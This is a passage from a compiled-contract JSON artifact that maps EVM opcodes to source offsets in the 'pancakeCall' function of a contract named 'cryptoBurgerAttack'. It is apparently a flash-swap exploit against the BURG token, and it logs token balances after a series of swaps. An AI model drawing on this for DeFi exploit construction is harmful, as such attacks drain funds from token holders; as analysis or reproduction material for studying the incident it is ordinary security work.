      "path": "0"
    },
    "3434": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5405
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "3439": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5405
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3440": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xD7F"
    },
    "3443": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3444": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5419,
        5434
      ],
      "op": "DUP7",
      "path": "0"
    },
    "3445": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5419,
        5434
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3446": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5448,
        5452
      ],
      "op": "DUP7",
      "path": "0"
    },
    "3447": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5448,
        5452
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3448": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3450": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "ADD",
      "path": "0"
    },
    "3451": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "3454": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        5355,
        5462
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3455": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3456": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3458": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3460": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3461": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3462": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3463": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "SUB",
      "path": "0"
    },
    "3464": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3465": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "DUP7",
      "path": "0"
    },
    "3466": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "GAS",
      "path": "0"
    },
    "3467": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "3468": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3469": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3470": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3471": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xD9C"
    },
    "3474": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3475": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3476": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3478": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3479": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3480": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3481": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3483": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3484": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3485": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "POP",
      "path": "0"
    },
    "3486": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "POP",
      "path": "0"
    },
    "3487": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "POP",
      "path": "0"
    },
    "3488": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "POP",
      "path": "0"
    },
    "3489": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3491": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3492": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3493": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3495": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3496": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3497": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3499": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3500": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3501": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3502": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "ADD",
      "path": "0"
    },
    "3503": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "3505": {
      "op": "NOT"
    },
    "3506": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "AND",
      "path": "0"
    },
    "3507": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3508": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "ADD",
      "path": "0"
    },
    "3509": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3511": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3512": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xDC4"
    },
    "3515": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3516": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3517": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3518": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "ADD",
      "path": "0"
    },
    "3519": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3520": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "3523": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        5355,
        5462
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3524": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3525": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5340,
        5462
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3526": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5340,
        5462
      ],
      "op": "POP",
      "path": "0"
    },
    "3527": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3529": {
      "op": "DUP1"
    },
    "3530": {
      "op": "MLOAD"
    },
    "3531": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3533": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "3536": {
      "op": "DUP4"
    },
    "3537": {
      "op": "CODECOPY"
    },
    "3538": {
      "op": "DUP2"
    },
    "3539": {
      "op": "MLOAD"
    },
    "3540": {
      "op": "SWAP2"
    },
    "3541": {
      "op": "MSTORE"
    },
    "3542": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5582
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 28
    },
    "3543": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5583,
        5584
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3545": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3546": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3547": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3548": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "LT",
      "path": "0"
    },
    "3549": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xDE8"
    },
    "3552": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3553": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xDE8"
    },
    "3556": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "3559": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        5570,
        5585
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3560": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3561": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "3563": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "MUL",
      "path": "0"
    },
    "3564": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "3566": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "ADD",
      "path": "0"
    },
    "3567": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "ADD",
      "path": "0"
    },
    "3568": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5570,
        5585
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3569": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3571": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3572": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xE4B"
    },
    "3575": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3576": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3577": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "3579": {
      "op": "DUP1"
    },
    "3580": {
      "op": "DUP3"
    },
    "3581": {
      "op": "MSTORE"
    },
    "3582": {
      "op": "PUSH1",
      "value": "0x3C"
    },
    "3584": {
      "op": "SWAP1"
    },
    "3585": {
      "op": "DUP3"
    },
    "3586": {
      "op": "ADD"
    },
    "3587": {
      "op": "MSTORE"
    },
    "3588": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3590": {
      "op": "DUP1"
    },
    "3591": {
      "op": "MLOAD"
    },
    "3592": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3594": {
      "op": "PUSH2",
      "value": "0x2FDE"
    },
    "3597": {
      "op": "DUP4"
    },
    "3598": {
      "op": "CODECOPY"
    },
    "3599": {
      "op": "DUP2"
    },
    "3600": {
      "op": "MLOAD"
    },
    "3601": {
      "op": "SWAP2"
    },
    "3602": {
      "op": "MSTORE"
    },
    "3603": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "3605": {
      "op": "DUP3"
    },
    "3606": {
      "op": "ADD"
    },
    "3607": {
      "op": "MSTORE"
    },
    "3608": {
      "op": "PUSH32",
      "value": "0x204255524720746F6B656E2061667465722035746820737761703A2000000000"
    },
    "3641": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "3643": {
      "op": "DUP3"
    },
    "3644": {
      "op": "ADD"
    },
    "3645": {
      "op": "MSTORE"
    },
    "3646": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3648": {
      "op": "DUP2"
    },
    "3649": {
      "op": "ADD"
    },
    "3650": {
      "op": "SWAP2"
    },
    "3651": {
      "op": "SWAP1"
    },
    "3652": {
      "op": "SWAP2"
    },
    "3653": {
      "op": "MSTORE"
    },
    "3654": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3656": {
      "op": "ADD"
    },
    "3657": {
      "op": "SWAP1"
    },
    "3658": {
      "op": "JUMP"
    },
    "3659": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3660": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3662": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3663": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3664": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3665": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "SUB",
      "path": "0"
    },
    "3666": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3667": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5477,
        5595
      ],
      "op": "LOG1",
      "path": "0"
    },
    "3668": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5681
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 29,
      "value": "0x0"
    },
    "3670": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5681
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3671": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3673": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3674": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "3679": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "3681": {
      "op": "SHL"
    },
    "3682": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3683": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3684": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5700,
        5704
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "3685": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3687": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3688": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "ADD",
      "path": "0"
    },
    "3689": {
      "op": "MSTORE"
    },
    "3690": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3692": {
      "op": "DUP1"
    },
    "3693": {
      "op": "MLOAD"
    },
    "3694": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3696": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "3699": {
      "op": "DUP4"
    },
    "3700": {
      "op": "CODECOPY"
    },
    "3701": {
      "op": "DUP2"
    },
    "3702": {
      "op": "MLOAD"
    },
    "3703": {
      "op": "SWAP2"
    },
    "3704": {
      "op": "MSTORE"
    },
    "3705": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3706": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3708": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3710": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3712": {
      "op": "SHL"
    },
    "3713": {
      "op": "SUB"
    },
    "3714": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5681
      ],
      "op": "AND",
      "path": "0"
    },
    "3715": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5681
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3716": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5691
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "3721": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5691
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3722": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "3724": {
      "op": "ADD"
    },
    "3725": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "3727": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3729": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3730": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3731": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3732": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "SUB",
      "path": "0"
    },
    "3733": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3734": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "DUP7",
      "path": "0"
    },
    "3735": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "GAS",
      "path": "0"
    },
    "3736": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "3737": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3738": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3739": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3740": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xEA9"
    },
    "3743": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3744": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3745": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3747": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3748": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3749": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3750": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3752": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3753": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3754": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "POP",
      "path": "0"
    },
    "3755": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "POP",
      "path": "0"
    },
    "3756": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "POP",
      "path": "0"
    },
    "3757": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "POP",
      "path": "0"
    },
    "3758": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3760": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3761": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3762": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3764": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "NOT",
      "path": "0"
    },
    "3765": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3767": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3768": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "ADD",
      "path": "0"
    },
    "3769": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "AND",
      "path": "0"
    },
    "3770": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3771": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "ADD",
      "path": "0"
    },
    "3772": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3773": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3775": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3776": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "POP",
      "path": "0"
    },
    "3777": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3778": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "ADD",
      "path": "0"
    },
    "3779": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3780": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xECD"
    },
    "3783": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3784": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3785": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "3788": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        5667,
        5706
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3789": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5667,
        5706
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3790": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3792": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5610,
        5716
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3793": {
      "fn": "cryptoBurgerAttack.pancakeCall",
